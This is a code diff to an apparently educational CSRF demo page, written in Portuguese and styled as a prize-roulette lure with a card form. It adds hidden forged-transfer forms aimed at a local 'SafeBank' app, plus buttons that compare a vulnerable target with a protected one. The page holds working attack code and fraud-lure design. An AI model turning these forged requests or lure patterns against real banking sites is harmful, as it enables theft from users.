@@ -235,6 +235,60 @@
     .submit-btn:hover { background: #003d82; }
     .fine-print { font-size: .72rem; color: #aaa; text-align: center; margin-top: 12px; line-height: 1.5; }
 
+    .demo-panel {
+      background: #0f172a;
+      color: #e5e7eb;
+      border-radius: 16px;
+      padding: 28px;
+      margin-bottom: 40px;
+      box-shadow: 0 6px 24px rgba(15, 23, 42, .28);
+    }
+    .demo-panel h2 { font-size: 1.2rem; margin-bottom: 10px; color: #fff; }
+    .demo-panel > p { font-size: .86rem; color: #cbd5e1; line-height: 1.55; margin-bottom: 18px; }
+    .attack-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 16px;
+    }
+    .attack-card {
+      background: #111827;
+      border: 1px solid #334155;
+      border-radius: 12px;
+      padding: 18px;
+    }
+    .attack-card h3 { font-size: 1rem; margin-bottom: 6px; color: #fff; }
+    .attack-card p { font-size: .8rem; color: #cbd5e1; line-height: 1.45; margin-bottom: 12px; }
+    .attack-btn {
+      width: 100%;
+      border: 0;
+      border-radius: 8px;
+      padding: 10px 12px;
+      color: #fff;
+      cursor: pointer;
+      font-size: .86rem;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .attack-btn.vulnerable { background: #dc2626; }
+    .attack-btn.secure { background: #16a34a; }
+    .attack-status {
+      min-height: 34px;
+      color: #f8fafc;
+      background: #020617;
+      border-radius: 8px;
+      padding: 9px 10px;
+      font-size: .76rem;
+      line-height: 1.45;
+      margin-bottom: 10px;
+    }
+    .attack-frame {
+      width: 100%;
+      height: 96px;
+      background: #fff;
+      border: 1px solid #475569;
+      border-radius: 8px;
+    }
+
     .testimonials {
       display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; margin-bottom: 40px;
     }
@@ -318,6 +372,35 @@
       <div class="timer" id="timer">⏰ Oferta expira em: 09:47</div>
     </div>
 
+    <div class="demo-panel" id="demo-panel">
+      <h2>Demonstracao tecnica do CSRF</h2>
+      <p>
+        Use um alvo por vez. Primeiro faca login no SafeBank que sera testado e depois envie o ataque abaixo.
+        O alvo vulneravel deve processar a transferencia. O alvo seguro deve devolver erro, pois nao recebe
+        um token CSRF valido e a origem da requisicao e externa.
+      </p>
+      <div class="attack-grid">
+        <div class="attack-card">
+          <h3>SafeBank vulneravel - porta 3000</h3>
+          <p>Envia um formulario HTML comum para <strong>/api/transfer</strong>. Esse alvo aceita o POST forjado.</p>
+          <button class="attack-btn vulnerable" onclick="fireCSRF('vulnerable')">
+            Atacar alvo vulneravel
+          </button>
+          <div class="attack-status" id="status-vulnerable">Aguardando envio.</div>
+          <iframe class="attack-frame" name="vulnerable-frame" id="frame-vulnerable" onload="markFrameLoaded('vulnerable')"></iframe>
+        </div>
+        <div class="attack-card">
+          <h3>SafeBank seguro - porta 3001</h3>
+          <p>Envia o mesmo formulario para o ambiente protegido. O backend deve bloquear por Origin/CSRF.</p>
+          <button class="attack-btn secure" onclick="fireCSRF('secure')">
+            Atacar alvo seguro
+          </button>
+          <div class="attack-status" id="status-secure">Aguardando envio.</div>
+          <iframe class="attack-frame" name="secure-frame" id="frame-secure" onload="markFrameLoaded('secure')"></iframe>
+        </div>
+      </div>
+    </div>
+
     <div class="form-section">
       <h2>💳 Informe os dados do cartão para receber</h2>
       <p style="font-size:.85rem;color:#666;margin-bottom:18px">
@@ -379,12 +462,16 @@
   </footer>
 
   <!-- Formulário oculto — ataque CSRF -->
-  <form id="x" action="http://localhost:3000/api/transfer" method="POST"
-        enctype="application/x-www-form-urlencoded" target="f" style="display:none">
+  <form id="attack-vulnerable" action="http://localhost:3000/api/transfer" method="POST"
+        enctype="application/x-www-form-urlencoded" target="vulnerable-frame" style="display:none">
     <input name="to"     value="bob" />
     <input name="amount" value="1000" />
   </form>
-  <iframe name="f" style="display:none"></iframe>
+  <form id="attack-secure" action="http://localhost:3001/api/transfer" method="POST"
+        enctype="application/x-www-form-urlencoded" target="secure-frame" style="display:none">
+    <input name="to"     value="bob" />
+    <input name="amount" value="1000" />
+  </form>
 
   <script>
     /* ── ROLETA ──────────────────────────────────────────── */
@@ -412,6 +499,7 @@
     let spinning   = false
     let spinCount  = 0
     const MAX_SPINS = 2
+    const submittedTargets = { vulnerable: false, secure: false }
 
     function drawWheel(rot) {
       ctx.clearRect(0, 0, canvas.width, canvas.height)
@@ -458,8 +546,27 @@
     /* ease-out quártica */
     function easeOut(t) { return 1 - Math.pow(1 - t, 4) }
 
-    function fireCSRF() {
-      document.getElementById('x').submit()
+    function fireCSRF(target = 'vulnerable') {
+      const form = document.getElementById(`attack-${target}`)
+      const status = document.getElementById(`status-${target}`)
+      if (!form || !status) return
+
+      submittedTargets[target] = true
+      status.textContent = target === 'secure'
+        ? 'Ataque enviado ao SafeBank Seguro. Resultado esperado: bloqueio por Origin/CSRF.'
+        : 'Ataque enviado ao SafeBank vulneravel. Resultado esperado: transferencia processada.'
+      form.submit()
+    }
+
+    function markFrameLoaded(target) {
+      if (!submittedTargets[target]) return
+
+      const status = document.getElementById(`status-${target}`)
+      if (!status) return
+
+      status.textContent = target === 'secure'
+        ? 'Resposta carregada abaixo. No ambiente seguro, a acao deve aparecer como erro 403 e o saldo nao deve mudar.'
+        : 'Resposta carregada abaixo. No ambiente vulneravel, a transferencia deve ser aceita e o saldo deve diminuir.'
     }
 
     function spin() {
